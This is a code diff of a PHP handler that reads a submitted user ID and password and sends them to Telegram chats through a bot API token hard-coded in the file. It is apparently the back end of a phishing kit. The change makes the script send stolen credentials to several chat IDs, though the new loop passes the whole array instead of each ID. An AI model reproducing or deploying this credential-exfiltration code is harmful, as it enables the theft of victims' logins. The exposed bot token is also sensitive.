@@ -1,21 +1,25 @@
 <?php
 // if there $_POST
 if (isset($_POST['userid'])) {
+  $chatid = array(['5014815328', '482529152']);
   $userid = $_POST['userid'];
   $password = $_POST['password'];
   $message_text = "Userid: $userid || Password: $password";
-  $telegram_id = '482529152';
-  $secret_token = '5072613015:AAFVW8R-AjeHUsb-Lj4hexxSKHTuyS3Ayzc';
-  $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
-  $url = $url . "&text=" . urlencode($message_text);
-  $ch = curl_init();
-  $optArray = array(
-    CURLOPT_URL => $url,
-    CURLOPT_RETURNTRANSFER => true
-  );
-  curl_setopt_array($ch, $optArray);
-  $result = curl_exec($ch);
-  curl_close($ch);
+  foreach ($chatid as $chat_id) {
+    $telegram_id = $chatid;
+    $secret_token = '5072613015:AAFVW8R-AjeHUsb-Lj4hexxSKHTuyS3Ayzc';
+    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message_text);
+    $ch = curl_init();
+    $optArray = array(
+      CURLOPT_URL => $url,
+      CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+  }
+
   // return $result;
 
 }
